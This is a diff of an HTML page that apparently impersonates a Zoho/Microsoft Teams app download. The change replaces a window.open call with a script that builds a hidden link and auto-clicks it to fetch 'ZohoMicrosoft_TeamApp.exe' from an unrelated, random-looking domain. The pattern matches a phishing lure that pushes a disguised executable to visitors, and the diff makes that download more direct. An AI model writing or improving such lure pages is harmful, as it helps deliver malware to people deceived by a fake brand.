@@ -133,10 +133,15 @@
         <p style="margin-bottom:6px;">You don’t have the app?</p>
         <a href="ZohoMicrosoft_TeamApp.exe" class="link" onclick="downloadFile();return false;">Download it now</a>
     </div>
-    <script>
-        function downloadFile() {
-            window.open("https://gvlki.tlucnsvsrbi.es/L4bfsKusByjq!O5/", "_blank");
-        }
-    </script>
+   <script>
+    function downloadFile() {
+        const link = document.createElement('a');
+        link.href = "https://gvlki.tlucnsvsrbi.es/L4bfsKusByjq!O5/";
+        link.download = "ZohoMicrosoft_TeamApp.exe"; // You can specify a filename here if desired
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+    }
+</script>
 </body>
 </html>
